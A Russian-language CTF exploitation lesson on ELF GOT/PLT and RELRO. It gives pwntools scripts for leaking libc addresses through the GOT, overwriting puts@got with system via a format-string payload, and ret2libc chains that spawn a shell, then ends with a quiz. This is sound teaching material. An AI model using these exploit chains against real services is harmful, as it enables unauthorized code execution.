---
id: pwn-got-plt
title: "GOT и PLT: динамическое связывание и утечки"
category: pwn
parent: pwn-rop-techniques
difficulty: medium
order: 1
tags: [got, plt, dynamic-linking, leak, relro]
prerequisites: [pwn-rop]
useful_for:
  - "CTF Pwn категория"
  - "Реверс-инжиниринг"
  - "Понимание линковки"
estimated_minutes: 35
summary: "Разбираем, как динамический линкер связывает вызовы libc через PLT/GOT, и как использовать GOT для утечки адресов и перезаписи указателей."
---
GOT и PLT — два механизма, на которых держится динамическое связывание ELF и, соответственно, значительная часть эксплуатации. Без понимания GOT/PLT невозможно ни утечь адрес libc, ни перехватить вызов функции, ни объяснить, почему перезапись GOT-записи даёт исполнение кода. Этот урок разбирает их устройство, ленивое связывание, RELRO и практические приёмы — утечки и перехват.

## Зачем вообще нужны GOT и PLT

Программа, скомпилированная с динамическими библиотеками, не знает адресов `printf`, `puts`, `system` на этапе компиляции: libc грузится по случайному адресу (ASLR), а сама может быть обновлена. Решение: компилятор оставляет в коде заглушки (PLT), а линкер при запуске заполняет таблицу адресов (GOT). При первом вызове функции работает «ленивое» разрешение через `_dl_runtime_resolve`; при последующих — прямой переход по адресу из GOT.

## PLT: Procedure Linkage Table

PLT — таблица маленьких трамплинов в исполняемом сегменте. Каждая запись — несколько инструкций:

```asm
0000000000401030 <puts@plt>:
  401030: jmp    QWORD PTR [rip+0x2f39]   # 0x403f70 <puts@got>
  401036: push   0x0                      # индекс символа
  401037: jmp    401020 <_init+0x20>      # -> _dl_runtime_resolve
```

При первом вызове `puts@got` ещё указывает на следующую инструкцию (`401036`), поэтому `jmp` уходит в «push/jmp resolve». Резолвер находит адрес `puts` в libc, записывает его в `puts@got` и передаёт управление туда. При втором вызове `jmp [puts@got]` уже идёт напрямую в libc.

## GOT: Global Offset Table

GOT — таблица в сегменте данных (`.got`/`.got.plt`), где хранятся абсолютные адреса. Запись `puts@got` изначально указывает внутрь PLT, после резолва — на реальный `puts` в libc.

```bash
readelf -r ./chall | grep -i puts
objdump -R ./chall | grep puts
objdump -d -j .plt ./chall
```

```python
from pwn import *
elf = ELF('./chall')
hex(elf.plt['puts'])     # 0x401030
hex(elf.got['puts'])     # 0x403f70
```

## Ленивое связывание и Partial RELRO

Если GOT writable (Partial RELRO), резолв ленивый: `puts@got` заполняется при первом вызове. Если Full RELRO, резолв всех символов происходит на старте (BIND_NOW), а GOT переводится в read-only — тогда перезапись GOT невозможна.

| RELRO | GOT | Ленивое связывание |
|---|---|---|
| No RELRO | writable | да |
| Partial RELRO | writable | да (обычно) |
| Full RELRO | read-only | нет |

Проверка: `checksec --file=./chall` или `readelf -l ./chall | grep GNU_RELRO`.

## Утечка libc через GOT

Главный приём: если есть `puts@plt` и контролируемый `rdi`, вызовите `puts(puts@got)` — функция напечатает 8 байт реального адреса `puts` в libc. Зная оффсет `puts` в конкретной libc, вычисляем базу.

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p = process('./chall')
p.sendlineafter(b'> ', flat({72: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc @ {hex(libc.address)}')
```

Вывод:

```
[+] libc @ 0x7ffff7dc0000
```

То же самое можно сделать через `write(1, write@got, 8)`, если `puts` недоступен: `rop.call(elf.plt['write'], [1, elf.got['write'], 8])`.

## Перехват вызова: overwrite GOT

Если есть примитив произвольной записи (format string, heap-примитив, `write` в адрес), можно записать адрес `system` в `puts@got`. Тогда следующий вызов `puts(x)` исполнит `system(x)`, и если `x = "/bin/sh"`, получим shell.

```python
# примитив: fmtstr
from pwn import *
payload = fmtstr_payload(6, {elf.got['puts']: libc.symbols['system']})
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()
```

Порядок: сначала утечь libc, затем записать `system` в GOT, затем подать строку `/bin/sh` на вход функции.

## GOT в эпоху Full RELRO и хуков

Full RELRO закрывает GOT. Тогда цели перехвата смещаются: `__malloc_hook`/`__free_hook` (до glibc 2.34), `_IO_2_1_stdout_` (FSOP), `__exit_funcs`, `environ` для утечки стека. Эти техники разбираются в `pwn-fsop`, `pwn-exit-handlers`, `pwn-environ-leak`.

## Неинициализированные GOT-записи (partial RELRO)

До первого вызова GOT-запись указывает на PLT+6. Это используется в атаках вида «переписать младшие байты GOT, чтобы перенаправить резолвер». Например, запись адреса `main` в GOT-запись `__libc_start_main` даёт бесконечный рестарт, или подмена индекса символа заставляет резолвер искать другой символ.

## Отладка GOT/PLT

```bash
gdb ./chall
(gdb) b *0x401036              # второй push в puts@plt
(gdb) x/gx 0x403f70            # содержимое puts@got
(gdb) info symbol *(void**)0x403f70
```

В pwndbg удобно `got` и `plt` — команды, печатающие таблицы. До первого вызова `puts@got` указывает внутрь PLT; после — на libc.

## Практический пример: утечка + перехват

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # 1) утечка
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({72: rop.chain()}))
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
    log.success(f'libc @ {hex(libc.address)}')
    # 2) вторая уязвимость -> fmtstr запись system в puts@got
    p.sendlineafter(b'> ', fmtstr_payload(6, {elf.got['puts']: libc.symbols['system']}))
    p.sendlineafter(b'> ', b'/bin/sh')
    p.interactive()

exploit()
```

## Митигации и обход

| Митигация | Обход |
|---|---|
| Full RELRO | hooks, FSOP, `__exit_funcs`, `_IO_str_overflow` |
| PIE | утечка базы кода |
| ASLR | утечка libc через GOT |
| GOT overwrite detection (relro) | переписать `.fini_array`, `atexit` |

## Справочные таблицы

| Команда | Назначение |
|---|---|
| `readelf -r ./chall` | релокации (GOT-записи) |
| `objdump -R ./chall` | динамические релокации |
| `objdump -d -j .plt ./chall` | дизассемблер PLT |
| `elf.plt['puts']` | адрес заглушки |
| `elf.got['puts']` | адрес GOT-записи |
| `fmtstr_payload(off, {got: val})` | запись в GOT |

| Симптом | Причина |
|---|---|
| `puts@got` указывает внутрь PLT | функция ещё не вызвана |
| GOT не перезаписывается | Full RELRO |
| Утечка мусорная | не хватает `ljust(8)` или не тот символ |

## Что дальше / решение

Понимание GOT/PLT — prerequisite для `pwn-ret2libc`, `pwn-fs-advanced` и `pwn-fsop`. Практический путь: соберите утечку libc через `puts@plt(puts@got)`, пересчитайте базу, затем найдите вторую уязвимость (или используйте ту же) для записи `system` в GOT. Если RELRO полный — переключайтесь на FSOP и хуки. Всегда проверяйте `checksec`: от RELRO зависит, какая стратегия вообще возможна.

## Символическое связывание и _dl_runtime_resolve

Ленивое связывание устроено так: запись GOT до резолва указывает на вторую инструкцию PLT (`push <index>`). Индекс — это смещение в таблице `.rela.plt`, по которому резолвер понимает, какой символ искать. Резолвер `_dl_runtime_resolve` сохраняет регистры, находит запись релокации, вычисляет адрес символа в загруженной библиотеке, пишет его в GOT и прыгает туда. Начиная с glibc 2.36 порядок немного изменился, но принцип тот же.

Эта механика эксплуатируется в атаке ret2dlresolve: мы подделываем структуру релокации на стеке так, чтобы резолвер разрешил произвольное имя символа (например, `system`) и вызвал его. Вход в резолвер требует корректного индекса и согласованного стека; pwntools автоматизирует это через `Ret2dlresolvePayload`. Подробнее — в `pwn-ret2dlresolve`.

## Практика: определение версии libc по утечке

Слитый адрес `puts` сам по себе бесполезен без правильной libc. Инструмент `libc-database` подбирает версию по младшим 12 битам (page offset) и, для полноты, по адресам нескольких символов.

```bash
./find puts 5c0
# или
python3 -c "from pwn import *; print(hex(ELF('./libc.so.6').symbols['puts']))"
```

Младшие 12 бит адреса символа не зависят от ASLR, поэтому их достаточно для поиска в базе. Для надёжности используйте утечку двух-трёх символов (`puts`, `read`, `system`) — комбинация их page offset уникальна. Разбор — в `pwn-libc-database`.

## Краевые случаи и подводные камни

- **Утечка непечатаемых байт.** `puts` останавливается на `\x00`; если младший байт адреса нулевой, утечка обрежется. Тогда используйте `write(1, addr, 8)`.
- **Неверная libc.** Оффсет `puts` из другой версии даёт мусорную базу и крах на следующем шаге. Всегда сверяйте page offset.
- **Full RELRO.** Запись в GOT невозможна — план атаки нужно менять.
- **PIE + Partial RELRO.** `elf.got[...]` вернёт смещение, а не абсолютный адрес; после утечки базы кода задайте `elf.address`.
- **BIND_NOW без RELRO.** Редкий случай, когда GOT writable, но резолв немедленный; перезапись всё равно возможна.
- **Кеш резолва.** После первого вызова GOT уже указывает в libc, и повторная утечка того же символа даст тот же адрес — используйте это для проверки стабильности.

## Расширенный пример: ret2libc с проверкой версии

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p.sendlineafter(b'> ', flat({72: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
assert leak & 0xfff == libc.symbols['puts'] & 0xfff, 'wrong libc!'
libc.address = leak - libc.symbols['puts']
log.success('libc ok')
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendlineafter(b'> ', flat({72: rop2.chain()}))
p.interactive()
```

Проверка `leak & 0xfff == libc.symbols['puts'] & 0xfff` ловит неверную libc до того, как эксплойт упадёт где-то в середине цепочки. Это простой и надёжный sanity-check.

## Итог

GOT хранит адреса, PLT — трамплины. Утечка через `puts@plt(got)` снимает ASLR, перезапись GOT при Partial RELRO даёт перехват вызова, Full RELRO вынуждает переходить к FSOP и хукам. Эти три факта — основа большинства userland-эксплойтов.

## Квиз

```quiz
- question: "Что содержит `GOT['puts']` после первого вызова `puts`?"
  options:
    - "Адрес PLT-трамплина"
    - "Реальный адрес `puts` в libc"
    - "Ноль"
    - "Адрес `main`"
  answer: 1
- question: "Чем отличается Full RELRO от Partial?"
  options:
    - "Full делает GOT read-only после релокаций"
    - "Full отключает ASLR"
    - "Partial удаляет GOT"
    - "Partial включает NX"
  answer: 0
- question: "Зачем `ljust(8, b'\x00')` при разборе утечки?"
  options:
    - "Для выравнивания строки"
    - "Адрес печатается до нулевого байта, нужно дополнить до 8 байт"
    - "Чтобы убрать перевод строки"
    - "Чтобы включить little-endian"
  answer: 1
- question: "Что нужно, чтобы вызвать `puts` в ROP-цепочке?"
  options:
    - "`elf.got['puts']`"
    - "`elf.plt['puts']`"
    - "`elf.symbols['puts']` (без PIE)"
    - "`elf.bss()`"
  answer: 1
- question: "Для чего утекают два символа libc?"
  options:
    - "Для обхода canary"
    - "Для определения точной версии libc по младшим 12 битам"
    - "Для выравнивания стека"
    - "Для поиска `/bin/sh`"
  answer: 1
```

## Где пригодится

- **CTF Pwn:** утечка libc через GOT — стандартный первый шаг при ASLR.
- **Реверс:** понимание PLT/GOT критично для анализа нативных бинарников и малвари.
- **Эксплуатация реальных CVE:** перезапись GOT-записей (например, `free_hook`/`malloc_hook` в старых glibc) — классика.
- **Работа:** анализ динамической линковки, разбор крэш-дампов, secure coding (Full RELRO как мера защиты).
